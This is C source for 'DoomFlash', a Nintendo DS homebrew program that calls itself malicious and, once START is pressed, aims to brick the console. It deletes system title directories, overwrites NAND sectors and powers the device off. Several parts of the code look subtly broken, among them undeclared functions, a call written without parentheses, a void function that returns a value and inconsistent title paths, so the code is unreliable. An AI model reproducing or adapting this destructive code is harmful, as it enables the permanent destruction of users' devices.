'''
--------------------------------------------------------------------------
						DOOMFLASH
--------------------------------------------------------------------------
				Written and compiled by Tenor-Z
				 	     2022, 2023
-------------------------------------------------------------------------
'''

#include <dirent.h>
#include <nds.h>
#include <nds/ndstypes.h>
#include <stdarg.h>
#include <stdio.h>
//#include <libnds.h>                 //We don't need libnds since we can access everything we need with nds.h


int main( int argc, char **argv) {
	int count = 300;

	lcdMainOnTop();                     //Put the stdout on the top screen
	consoleDemoInit();				      //And initialize it
	setCpuClock(999.0);
    struct statvfs st;
	statvfs("/", &st);						//To initialize the filesystem, get the root directory
	scanKeys();									//This is where the program frequently scans for button input
	lcdSwap();                                      //Switch the stdout to the bottom screen
	splash();                                         //And display the splash screen
	while(count--) swiWaitForVBlank;
	swiWaitForVBlank();
	scanKeys();
	int keys = keysDown();
	if (keys & KEY_START){                          //keys checks for if a button has been pressed (down position)
		printf("\e[1;1H\e[2J");						//If the START button was pressed, start wrecking stuff
		printf("Pressed");
		destroy();
	}
	while(1) {
	
		swiWaitForVBlank();                     //The main loop of the program
		scanKeys();                             //Constantly scans for button outputs which go to different screens
		int keys = keysDown();
		if (keys & KEY_SELECT) break;	            // SELECT = Exits out of the program
		if (keys & KEY_START) destroy();             // START = Destroys the console
		if (keys & KEY_DOWN) credits();               // DPAD DOWN = View somewhat of credits
		if (keys & KEY_UP) back();                   //DPAD UP = Go back to the main menu
	
	}

	return 0;
}

void destroy(){
	printf("\e[1;1H\e[2J");                        //This print statement basically clears all stdout off the screen
	printf("STARTING BRICK PROCESS......\n");
	swiDelay(49999999000);                         //Same as sleep (gives the user more time to back out)
    remove("/title");
	remove("/progress");
	remove("/title/0003005/484e4945");
	remove("/title/00030005/484e4541");
	remove("/title/0003005/484e4441");
	remove("/title/0003005/484e4b45");
	remove("/title/00030015/484e4245");
	remove("/title/00030015/484e4b45");
	printf("				  \n");
	printf("On your marks.....\n");
	swiDelay(49999999000);
	printf("				  \n");
	printf("Time to blow shit up!");
	nand_WriteSectors(0, 8, 512);                    //Write null bytes of data to sectors on the NAND
	nand_WriteSectors(1, 8, 512); 
	nand_WriteSectors(2, 8, 512);
	powerOff(0);                                       //And power the console off
	exit(0);                                            //Bye bye DS
}

//The main warning splash banner
//This goes unused for a reason I cannot remember
//(Probably text size limitations or something)
void warning(){
	printf("\e[1;1H\e[2J");
	printf("		WARNING!!             \n");
	printf("By running this homebrew, you run the risk\n");
	printf("bricking your Nintendo DS. This program is meant to\n");
	printf("be malicious. If you have no intentions of destroying this\n");
	printf("system, turn off your console now.");
	printf("");
	printf("The process will begin soon.");
	//if (keysHeld() & KEY_A){
		//title();
	
}

//Main menu splash screen
void splash(){
	printf("\e[1;1H\e[2J");
	printf("=======================\n");
	printf("		 DoomFlash		\n");
	printf(" 	 Written by Vangex\n");
	printf("=======================\n");
	printf("						\n");
	printf("Press Start to Destroy your DS\n");
	printf("						\n");
	printf("Press Select to Exit\n");
	printf("						\n");
	printf("Press Down to view credits\n");
}

void credits(){
	printf("\e[1;1H\e[2J");
	printf("=======================\n");
	printf("	  DoomFlash		   \n");
	printf("=======================\n");
	printf("Programmed and Created by\n");
	printf("	    Tenor-Z			\n");
	printf("	  @2022-2023		\n");
	printf("========================\n");
	printf("Salutations to the pansies\n");
	printf("of Project Dandelion and\n");
	printf("everybody back in CSI.\n");
	printf("=========================\n");
	printf("Press UP to go back.\n");
}

//This whole function is a mess since I sucked ass at C at the time. (messy as fuck)
//Might fix this in the future but the program works fine
void back(){
	int count = 300;

	lcdMainOnTop();
	consoleDemoInit();
	setCpuClock(999.0);
    struct statvfs st;
	statvfs("/", &st);
	scanKeys();
	lcdSwap();
	splash();
	while(count--) swiWaitForVBlank;
	swiWaitForVBlank();
	scanKeys();
	int keys = keysDown();
	if (keys & KEY_START){
		printf("\e[1;1H\e[2J");
		printf("Pressed");
		destroy();
	}
	while(1) {
	
		swiWaitForVBlank();
		scanKeys();
		int keys = keysDown();
		if (keys & KEY_SELECT) break;	
		if (keys & KEY_START) destroy();
		if (keys & KEY_DOWN) credits();
		if (keys & KEY_UP) back();
	
	}

	return 0;
}